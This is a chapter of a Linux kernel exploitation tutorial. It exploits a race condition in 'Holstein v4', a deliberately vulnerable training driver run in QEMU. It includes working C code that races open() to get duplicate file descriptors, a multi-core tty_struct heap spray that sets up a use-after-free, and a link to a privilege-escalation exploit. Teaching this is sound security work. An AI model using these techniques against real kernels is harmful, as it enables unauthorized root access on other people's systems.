---
title: "Holstein v4: Race Condition"
tags:
    - [Linux]
    - [Kernel]
    - [Race Condition]
    - [Data Race]
lang: en
permalink: /en/linux-kernel/LK01/race_condition.html
pagination: true
bk: use_after_free.html
fd: ../LK02/null_ptr_deref.html
---
In the [previous chapter](use_after_free.html), we exploited a Use-after-Free in the Holstein module and achieved privilege escalation. On the third try, the developer finally fixed the module with a third patch and released Holstein v4. According to the author, there are no more vulnerabilities and there will be no further updates. In this chapter, we exploit the final Holstein v4 module.

## Patch analysis
The final v4 can be downloaded [here](distfiles/LK01-4.tar.gz). First, let's check the differences from v3.
In the boot script `run.sh`, the system was changed to run on multiple cores:
```diff
-    -smp 1 \
+    -smp 2 \
```
In the program itself, the memory leak and the Use-after-Free were fixed.
The first change is in `open`: if someone else already has the driver open, the variable `mutex` becomes 1 and `open` fails.
```c
int mutex = 0;
char *g_buf = NULL;

static int module_open(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_open called\n");

  if (mutex) {
    printk(KERN_INFO "resource is busy");
    return -EBUSY;
  }
  mutex = 1;

  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }

  return 0;
}
```
In other words, the driver can no longer be opened again while it is already open. Once the open file descriptor is closed, `mutex` goes back to 0 and `open` becomes possible again.
```c
static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  mutex = 0;
  return 0;
}
```
So where is the bug? Think about it for a moment.

## Race condition
At first glance, this implementation may look perfect, but in fact it still does not fully account for the case where **multiple processes access the same resource**.
Operating systems implement context switching so that multiple processes or threads can run at the same time, and the switch does not only happen at function boundaries. It can occur at instruction granularity[^1]. Naturally, the context may switch while `module_open` is still running.
In this chapter, we exploit exactly this kind of concurrency bug, a **race condition**, to build the exploit.

### Conditions for the bug
First, think about what result a race can produce. Suppose the context switches in the following order:

<center>
  <img src="img/race1.png" alt="Correct behavior in a multithreaded case" style="width:620px;">
</center>

Initially `mutex` contains 0, so thread 1 takes the branch and reaches the path that allocates `g_buf`. Then the blue instruction stores the allocated address into `g_buf`.
Next, a context switch occurs and execution moves to thread 2. At that point `mutex` already contains 1, so thread 2 does not take the allocation path and instead reaches the `EBUSY` return path, causing `open` to fail.
So in this example, `module_open` behaves as the developer intended.
Now consider the execution order in the figure below:

<center>
  <img src="img/race2.png" alt="Example behavior that falls into a race condition" style="width:620px;">
</center>

As before, thread 1 reaches the path that allocates `g_buf`. But this time a context switch happens before 1 is written into `mutex`.
As a result, when thread 2 checks the condition, `mutex` is still 0, so thread 2 also reaches the path that allocates `g_buf`. Then the blue instruction stores the newly allocated address into `g_buf`.
Eventually execution switches back to thread 1, which finishes its own allocation and stores that address into `g_buf` with the red instruction.
This means both threads end up returning success from `open`, and both of them are left sharing the address allocated by thread 1.

This is why kernel-space code must always be designed with multithreading in mind. Otherwise, bugs like this appear.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="Wolf" ></div>
  <p class="says">
   This race happened because reads and writes of the variable <code>mutex</code> were not done with atomic operations.
  </p>
</div>

If `open` succeeds twice, then after one side calls `close`, `g_buf` still points to freed memory, so we can trigger a Use-after-Free just like in the previous chapter.

### Winning the race
Let's first write code to verify that racing `open` is really possible.
It is easy to trigger many attempts by repeatedly calling `open` from multiple threads, but we need a way to decide when the race succeeded so we can stop looping. There are several ways to detect success. A reasonable approach would be to perform `read` from both threads and consider it a success if both work. In this case, to reduce unnecessary `read` calls, we instead check the file descriptors. If two threads both succeed in `open`, one of the file descriptors must be 4.
The author wrote the following race by running the same function in two threads. Of course, you could also loop in the main thread or use a different success condition if you prefer. Be careful not to forget `-lpthread` in the compile options so that `libpthread` is linked.
```c
void* race(void *arg) {
  while (1) {
    // Keep trying until one of the threads gets fd 4
    while (!win) {
      int fd = open("/dev/holstein", O_RDWR);
      if (fd == 4) win = 1;
      if (win == 0 && fd != -1) close(fd);
    }

    // Check that the other thread did not accidentally close the fd
    if (write(3, "A", 1) != 1 || write(4, "a", 1) != 1) {
      // failure
      close(3);
      close(4);
      win = 0;
    } else {
      // success
      break;
    }
  }

  return NULL;
}

int main() {
  pthread_t th1, th2;

  pthread_create(&th1, NULL, race, NULL);
  pthread_create(&th2, NULL, race, NULL);
  pthread_join(th1, NULL);
  pthread_join(th2, NULL);

  char buf[0x400];
  int fd1 = 3, fd2 = 4;
  write(fd1, "Hello", 5);
  read(fd2, buf, 5);
  printf("%s\n", buf);

  return 0;
}
```
This succeeds in the race with almost 100% probability. The time required is on the order of milliseconds, so it is good enough to use as an exploit primitive.

<div class="column" title="Column: Race condition and data race">
  The terms "race condition" and "data race" sound similar, but they do not mean the same thing, nor are they a pair of parallel terms that simply complement each other.<br>
  A data race means that two threads access the same memory location concurrently, and at least one of them writes to it. This leads to undefined behavior. Data races can be solved with proper synchronization or atomic operations.<br>
  A race condition, on the other hand, means that different thread interleavings produce different results. Like a logic bug, it simply means "the program behaves that way because that is how it was written." It may cause unexpected behavior, but that is not the same thing as undefined behavior. If multithreading creates a result contrary to the programmer's intent, then the program has a race-condition bug.<br>
  In this driver, there is a race-condition bug caused by an implementation mistake, and that in turn creates a data race on the buffer pointer.
</div>

## CPU cores and heap spray
Exploits that rely on races are often written with multiple threads like this, but there is one more thing to keep in mind.
If multiple threads are triggering the race, then multiple CPU cores are involved during the attack. Naturally, one of those cores will execute `module_open` and allocate memory through `kzalloc`.
Now recall the properties of the [SLUB allocator](heap_overflow#slub-allocator) explained in the Heap Overflow chapter. In SLUB, the slabs used for object allocation are managed in CPU-local areas.
That means if the `g_buf` allocated on a CPU core different from the one currently running `main` is later freed, it will be linked back into the slab corresponding to the CPU that performed the allocation. If we then do a heap spray only from the `main` thread, it will not overlap with the freed `g_buf`.
So in a case like this, make sure to **run the heap spray from multiple threads as well**.

Also, opening `/dev/ptmx` creates new file descriptors, and there is a limit to how many file descriptors one process can have. If you need a large spray, you may need to close unrelated descriptors as soon as you detect that the spray has hit.
```c
void* spray_thread(void *args) {
  long x;
  long spray[800];

  for (int i = 0; i < 800; i++) {
    usleep(10);
    // spray tty_struct
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) {
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void*)-1;
    }

    if (read(fd2, &x, sizeof(long)) == sizeof(long) && x) {
      // hit
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void*)spray[i];
    }
  }

  for (int i = 0; i < 800; i++)
    close(spray[i]);
  return (void*)-1;
}

...

  // Create the Use-after-Free
  close(fd1);

  /* Heap spray across multiple cores */
  long victim_fd = -1;
  // Try from the main thread first
  victim_fd = (long)spray_thread(NULL);
  // If that fails, use the result from another thread
  while (victim_fd == -1) {
    puts("[+] spraying on another CPU...");
    pthread_create(&th1, NULL, spray_thread, NULL);
    pthread_join(th1, (void*)&victim_fd);
  }
```

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="Wolf" ></div>
  <p class="says">
   The <code>sched_setaffinity</code> function lets you restrict which CPU a thread can run on, so even if the number of cores increases, you can still force behavior similar to the 2-core case.
  </p>
</div>

## Privilege escalation
From here on, we just perform privilege escalation in the same way as before.
We trigger a Use-after-Free through the data race and then place a `tty_struct` on top of it via heap spray. Once you wrap that whole sequence into a function, it becomes easy to trigger the Use-after-Free repeatedly.

A sample exploit can be downloaded [here](exploit/race-krop.c).

<center>
  <img src="img/race_privesc.png" alt="Privilege escalation via race condition" style="width:320px;">
</center>

Race-condition exploits are difficult to debug, so the key points in exploit development are whether the theory can actually be realized in practice and whether you can build a primitive that triggers the race reliably with high probability.

[^1]: Some CPUs also reorder instruction execution internally for optimization, which is an even finer-grained issue, but it is unrelated here and we will not discuss it.

---

<div class="column" title="Exercise">
  Try changing the QEMU boot option to raise the number of CPU cores to 4 or 8, and measure how often the race and spray in your exploit succeed.<br>
  If the failure probability becomes high, modify the exploit so that it works reliably regardless of the number of cores.
</div>
